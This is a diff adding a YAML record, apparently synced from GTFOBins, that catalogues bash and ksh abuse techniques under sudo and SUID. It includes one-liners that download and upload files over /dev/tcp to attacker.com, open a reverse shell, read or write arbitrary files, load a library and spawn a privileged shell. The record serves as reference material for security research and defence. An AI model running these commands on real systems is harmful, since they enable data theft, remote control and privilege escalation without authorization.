@@ -1,0 +1,182 @@
+id: gtfobins/bash/download/sudo
+type: binary
+platform: linux
+name: bash
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+aliases:
+- ksh
+commands:
+- template: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\\
+    n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\"\
+    \ = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
+- template: bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
+references:
+- https://gtfobins.github.io/gtfobins/bash/
+- https://gtfobins.github.io/gtfobins/ksh/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        bash:
+          functions:
+            download:
+            - binary: false
+              code: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\\
+                r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while\
+                \ read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
+              contexts:
+                sudo: null
+                suid:
+                  code: "bash -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\\
+                    r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | {\
+                    \ while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat;\
+                    \ } >/path/to/output-file'"
+                unprivileged: null
+              sender: http-server
+            - binary: false
+              code: bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
+                unprivileged: null
+              sender: tcp-server
+            file-read:
+            - binary: false
+              code: bash -c 'echo "$(</path/to/input-file)"'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'echo "$(</path/to/input-file)"'
+                unprivileged: null
+            - binary: false
+              code: 'HISTTIMEFORMAT=$''\r\e[K''
+
+                history -c
+
+                history -r /path/to/input-file
+
+                history'
+              comment: This only works interactively from an existing `bash` session.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: bash -c 'echo DATA >/path/to/output-file'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'echo DATA >/path/to/output-file'
+                unprivileged: null
+            - binary: false
+              code: 'HISTIGNORE=''history *''
+
+                history -c
+
+                DATA
+
+                history -w /path/to/output-file'
+              comment: This only works interactively from an existing `bash` session. It adds timestamps
+                to the output file.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            library-load:
+            - code: bash -c 'enable -f /path/to/lib.so x'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'enable -f /path/to/lib.so x'
+                unprivileged: null
+            reverse-shell:
+            - code: bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: bash
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p
+                unprivileged: null
+            upload:
+            - binary: false
+              code: bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+                unprivileged: null
+              receiver: http-server
+            - binary: false
+              code: bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+              contexts:
+                sudo: null
+                suid:
+                  code: bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+                unprivileged: null
+              receiver: tcp-server
+        ksh:
+          alias: bash
+    upstream_url: https://gtfobins.github.io/gtfobins/bash/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:a145613266f0fb38880854765fd5be6cf334062199398319daee9142bd69d841
